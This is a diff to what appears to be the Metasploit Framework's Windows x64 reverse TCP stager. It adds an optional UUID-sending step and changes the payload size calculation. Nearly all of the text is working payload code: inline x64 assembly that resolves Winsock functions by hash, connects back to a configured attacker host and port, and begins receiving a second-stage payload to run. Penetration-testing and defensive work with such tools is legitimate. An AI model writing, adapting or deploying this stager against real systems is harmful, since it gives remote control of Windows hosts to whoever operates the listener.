@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/transport_config'
+require 'msf/core/payload/windows/x64/send_uuid'
 require 'msf/core/payload/windows/x64/block_api'
 require 'msf/core/payload/windows/x64/exitfunk'
 
@@ -17,6 +18,7 @@ module Payload::Windows::ReverseTcp_x64
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
+  include Msf::Payload::Windows::SendUUID_x64
   include Msf::Payload::Windows::BlockApi_x64
   include Msf::Payload::Windows::Exitfunk_x64
 
@@ -45,6 +47,14 @@ module Payload::Windows::ReverseTcp_x64
     end
 
     generate_reverse_tcp(conf)
+  end
+
+  #
+  # By default, we don't want to send the UUID, but we'll send
+  # for certain payloads if requested.
+  #
+  def include_send_uuid
+    false
   end
 
   #
@@ -80,6 +90,8 @@ module Payload::Windows::ReverseTcp_x64
     # Reliability adds 10 bytes for recv error checks
     space += 10
 
+    space += uuid_required_size if include_send_uuid
+
     # The final estimated size
     space
   end
@@ -112,17 +124,17 @@ module Payload::Windows::ReverseTcp_x64
         mov r12, #{encoded_host_port}
         push r12               ; host, family AF_INET and port
         mov r12, rsp           ; save pointer to sockaddr struct for connect call
-        ; perform the call to LoadLibraryA...
+      ; perform the call to LoadLibraryA...
         mov rcx, r14           ; set the param for the library to load
         mov r10d, 0x0726774C   ; hash( "kernel32.dll", "LoadLibraryA" )
         call rbp               ; LoadLibraryA( "ws2_32" )
-        ; perform the call to WSAStartup...
+      ; perform the call to WSAStartup...
         mov rdx, r13           ; second param is a pointer to this stuct
         push 0x0101            ;
         pop rcx                ; set the param for the version requested
         mov r10d, 0x006B8029   ; hash( "ws2_32.dll", "WSAStartup" )
         call rbp               ; WSAStartup( 0x0101, &WSAData );
-        ; perform the call to WSASocketA...
+      ; perform the call to WSASocketA...
         push rax               ; if we succeed, rax wil be zero, push zero for the flags param.
         push rax               ; push null for reserved parameter
         xor r9, r9             ; we do not specify a WSAPROTOCOL_INFO structure
@@ -134,7 +146,7 @@ module Payload::Windows::ReverseTcp_x64
         mov r10d, 0xE0DF0FEA   ; hash( "ws2_32.dll", "WSASocketA" )
         call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
         mov rdi, rax           ; save the socket for later
-        ; perform the call to connect...
+      ; perform the call to connect...
         push 16                ; length of the sockaddr struct
         pop r8                 ; pop off the third param
         mov rdx, r12           ; set second param to pointer to sockaddr struct
@@ -143,7 +155,11 @@ module Payload::Windows::ReverseTcp_x64
         call rbp               ; connect( s, &sockaddr, 16 );
         ; restore RSP so we dont have any alignment issues with the next block...
         add rsp, #{408+8+8*4+32*4} ; cleanup the stack allocations
+    ^
 
+    asm << asm_send_uuid if include_send_uuid
+
+    asm << %Q^
       recv:
         ; Receive the size of the incoming second stage...
         sub rsp, 16            ; alloc some space (16 bytes) on stack for to hold the second stage length
